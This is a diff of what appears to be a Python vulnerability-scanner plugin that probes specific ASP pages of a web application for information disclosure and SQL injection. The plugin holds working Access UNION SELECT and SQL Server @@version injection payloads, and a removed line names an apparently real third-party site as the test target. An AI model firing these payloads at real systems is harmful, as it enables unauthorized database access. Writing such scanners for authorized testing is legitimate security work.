@@ -23,6 +23,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(payload)
         if code == 200 and '密码'.decode('utf-8').encode('gb2312') in res:
             security_hole('info disclosure: ' + payload)
+            return arg
     #SQL注入 Access 注入
     payloads = [
         arg + 'gjdcx/cxszbj.asp?cxid=-7201%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
@@ -34,6 +35,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(payload)
         if code == 200 and exp_1 in res:
             security_hole('sql injection:' + payload)
+            return arg
     #SQL注入 SQL Server 注入
     payloads = [
         arg + 'csccmis/jctxx.asp?jcid=1%20and%201=@@version%20--',
@@ -51,7 +53,8 @@ def audit(arg):
         if code != 0 and 'Microsoft SQL Server' in res:
             security_hole('SQL injection: '+ payload)
 
-    
-if __name__ == '__main__':
+
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('insight', 'http://www.nbskylark.com/')[1])
